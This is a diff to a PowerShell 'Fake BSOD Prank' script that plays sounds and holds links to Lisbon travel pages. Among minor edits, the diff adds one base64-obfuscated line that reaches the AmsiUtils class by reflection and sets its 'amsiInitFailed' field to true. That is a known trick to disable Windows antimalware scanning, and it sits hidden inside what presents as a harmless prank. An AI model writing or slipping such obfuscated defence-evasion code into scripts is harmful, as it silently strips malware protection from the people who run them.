@@ -73,13 +73,13 @@
 
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-$PlayWav = New-Object System.Media.SoundPlayer
 [int]$FinalSfx = $MaxInteractions -1 #Set the last interaction!
 write-host "* Powershell Fake BSOD Prank" -ForegroundColor Green
 $LasLink = "https://www.travelgay.pt/destination/gay-portugal/gay-lisbon"
 $UrlLink = "https://www.travelgay.com/destination/gay-portugal/gay-lisbon"
 $UriLink = "https://theculturetrip.com/europe/portugal/lisbon/articles/the-top-10-lgbt-clubs-and-bars-in-lisbon"
 
+[Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
 
 #Download sound sfx files from my github repository
 If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
@@ -122,6 +122,7 @@ If($PreventBSOD -ieq "true")
 
 
 #lOOP Function
+$PlayWav = New-Object System.Media.SoundPlayer
 write-host "* maxinteractions: $MaxInteractions with: $DelayTime (seconds)" -ForegroundColor Green
 For($i=1; $i -lt $MaxInteractions; $i++)
 {
